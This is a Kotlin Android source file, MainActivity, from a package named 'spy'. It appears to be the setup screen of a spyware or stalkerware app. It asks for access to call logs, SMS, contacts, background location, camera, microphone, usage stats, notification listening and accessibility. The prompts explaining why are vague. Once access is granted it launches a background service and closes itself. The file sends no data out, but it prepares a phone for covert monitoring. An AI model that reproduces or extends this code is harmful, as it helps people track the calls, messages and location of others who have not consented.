package com.gauravhanna.spy

import android.Manifest
import android.app.AppOpsManager
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PERMISSION_REQUEST_CODE = 100
        private const val BACKGROUND_LOCATION_REQUEST_CODE = 101
        private const val POST_NOTIFICATIONS_REQUEST_CODE = 102
    }

    private var dialog: AlertDialog? = null
    private var isDialogShowing = false

    private val requiredPermissions = listOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (hasAllDangerousPermissions()) {
            checkSpecialPermissions()
        } else {
            ActivityCompat.requestPermissions(
                this,
                requiredPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    private fun hasAllDangerousPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onDestroy() {
        dialog?.dismiss()
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (isFinishing || isDestroyed) return

        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    checkSpecialPermissions()
                } else {
                    showPermissionExplanationDialog()
                }
            }

            BACKGROUND_LOCATION_REQUEST_CODE,
            POST_NOTIFICATIONS_REQUEST_CODE -> {
                checkSpecialPermissions()
            }
        }
    }

    private fun checkSpecialPermissions() {
        if (isFinishing || isDestroyed) return

        var allGranted = true

        // ✅ FIXED: Usage Access (safe for all APIs)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val appOps = getSystemService(APP_OPS_SERVICE) as AppOpsManager

            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(),
                    packageName
                )
            } else {
                AppOpsManager.MODE_ALLOWED // safe fallback
            }

            if (mode != AppOpsManager.MODE_ALLOWED) {
                allGranted = false
                showDialogSafe(
                    "Usage Access Required",
                    "Enable Usage Access to track app usage.",
                    Settings.ACTION_USAGE_ACCESS_SETTINGS
                )
                return
            }
        }

        // Notification Access
        val notificationAccess = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )?.contains(packageName) == true

        if (!notificationAccess) {
            allGranted = false
            showDialogSafe(
                "Notification Access Required",
                "Enable Notification Access.",
                Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
            )
            return
        }

        // Accessibility
        val accessibilityEnabled = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )?.contains(packageName) == true

        if (!accessibilityEnabled) {
            allGranted = false
            showDialogSafe(
                "Accessibility Required",
                "Enable Accessibility.",
                Settings.ACTION_ACCESSIBILITY_SETTINGS
            )
            return
        }

        // Background Location
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    BACKGROUND_LOCATION_REQUEST_CODE
                )
                return
            }
        }

        // Notifications (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                    POST_NOTIFICATIONS_REQUEST_CODE
                )
                return
            }
        }

        if (allGranted) {
            startBackgroundService()
        }
    }

    // ✅ FIXED SAFE DIALOG
    private fun showDialogSafe(title: String, message: String, action: String) {
        if (isFinishing || isDestroyed || isDialogShowing) return

        isDialogShowing = true

        runOnUiThread {
            dialog = AlertDialog.Builder(this)
                .setTitle(title)
                .setMessage(message)
                .setCancelable(false)
                .setPositiveButton("Open Settings") { _, _ ->
                    startActivity(Intent(action))
                    isDialogShowing = false
                }
                .setNegativeButton("Skip") { _, _ ->
                    startBackgroundService()
                    isDialogShowing = false
                }
                .create()

            dialog?.show()
        }
    }

    private fun showPermissionExplanationDialog() {
        if (isFinishing || isDestroyed) return

        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("Allow all permissions for full functionality.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            .setNegativeButton("Exit") { _, _ ->
                finishAffinity()
            }
            .show()
    }

    private fun startBackgroundService() {
        Log.d(TAG, "Starting service")

        val intent = Intent(this, BackgroundService::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        finish()
    }
}